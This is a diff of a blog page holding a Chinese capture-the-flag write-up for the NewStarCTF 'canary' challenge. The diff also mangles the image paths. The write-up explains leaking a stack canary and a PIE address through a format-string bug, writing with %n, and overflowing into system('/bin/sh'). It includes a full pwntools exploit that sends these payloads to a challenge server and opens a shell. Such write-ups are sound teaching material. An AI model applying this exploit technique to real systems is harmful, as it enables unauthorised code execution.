@@ -23,17 +23,17 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="[NewStarCTF 公开赛赛道]canary  我们可以先checksec一下：  可以看到，所有的东西都是开了的，非常的离谱，这道题给了源码，我们去看看源码：  上面的注释是我加的，题目本生是没有的，思路很明显的，我们先要泄露出canary的值，再找一条指令，泄露出这条指令的动态加载地址，因为题目是开启了PIE的，用动态加载的地址，减去偏移地址（IDA确定偏移地址），就能找到动态加载的基地址">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/1.png">
-<meta property="og:image" content="http://example.com/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/2.png">
-<meta property="og:image" content="http://example.com/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/3.png">
-<meta property="og:image" content="http://example.com/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/4.png">
-<meta property="og:image" content="http://example.com/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/5.png">
+<meta property="og:image" content="http://example.com/.com//1.png">
+<meta property="og:image" content="http://example.com/.com//2.png">
+<meta property="og:image" content="http://example.com/.com//3.png">
+<meta property="og:image" content="http://example.com/.com//4.png">
+<meta property="og:image" content="http://example.com/.com//5.png">
 <meta property="article:published_time" content="2024-06-03T12:29:56.000Z">
 <meta property="article:modified_time" content="2024-06-03T13:04:35.126Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/1.png">
+<meta name="twitter:image" content="http://example.com/.com//1.png">
   
   
   
@@ -282,14 +282,14 @@
                 <h1 align="center">[NewStarCTF 公开赛赛道]canary</h1>
 
 <p>我们可以先checksec一下：</p>
-<p><img src="/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>可以看到，所有的东西都是开了的，非常的离谱，这道题给了源码，我们去看看源码：</p>
-<p><img src="/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>上面的注释是我加的，题目本生是没有的，思路很明显的，我们先要泄露出canary的值，再找一条指令，泄露出这条指令的动态加载地址，因为题目是开启了PIE的，用动态加载的地址，减去偏移地址（IDA确定偏移地址），就能找到动态加载的基地址，然后就可以解决money变量的真实地址问题，就可以使用%n向money变量写入值，最后一个read函数就可以溢出到system函数了，我们也可以看到，”&#x2F;bin&#x2F;sh”在函数中定义了，在此之前，我们要确定输入的变量在栈上的位置：</p>
-<p><img src="/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
-<p>可以确定，是第六个参数，我们去寻找一条指令，泄露出它的动态加载地址：<img src="/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p><img src="/.com//3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p>可以确定，是第六个参数，我们去寻找一条指令，泄露出它的动态加载地址：<img src="/.com//4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>我选择的指令是xor ebp,ebp，%9$p就可以泄露它的地址，因为它在canary值前面两个，11-2&#x3D;9：</p>
-<p><img src="/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p><img src="/.com//5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>最后三位是不变的，可以确定是对的，payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#sh = process(&quot;./pwn&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25350</span>)<br><br>sh.recvuntil(<span class="hljs-string">&quot;Now answer me, will you v me 50&quot;</span>)<br>payload = <span class="hljs-string">&quot;%11$p-%9$p&quot;</span><br>sh.sendline(payload)<br><br>sh.recvline()<br><br>canary = sh.recvuntil(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">18</span>]<br>xor_ebp_ebp_address = sh.recv(<span class="hljs-number">14</span>)<br><br>canary = <span class="hljs-built_in">int</span>(canary,<span class="hljs-number">16</span>)<br>xor_ebp_ebp_address = <span class="hljs-built_in">int</span>(xor_ebp_ebp_address,<span class="hljs-number">16</span>)<br>libc_base = xor_ebp_ebp_address - <span class="hljs-number">0x840</span><br>money_address = libc_base + <span class="hljs-number">0x20206c</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary-----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor_ebp_ebp_address------&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(xor_ebp_ebp_address))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base---------&gt;&quot;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br><br>sh.recvuntil(<span class="hljs-string">&#x27;What do you want to say to the canary&#x27;</span>)<br>payload = <span class="hljs-string">&quot;%999c%8$n&quot;</span> + <span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x7</span>) +  p64(money_address)<br><br>sh.sendline(payload)<br><br>sh.recv()<br><br>system_address = libc_base + <span class="hljs-number">0x9DC</span><br>bin_sh_address = libc_base + <span class="hljs-number">0x202020</span><br>pop_rdi_ret_address = libc_base + <span class="hljs-number">0xb33</span><br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>) + p64(canary) + <span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x8</span>) +  p64(pop_rdi_ret_address) + p64(bin_sh_address) + p64(system_address)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
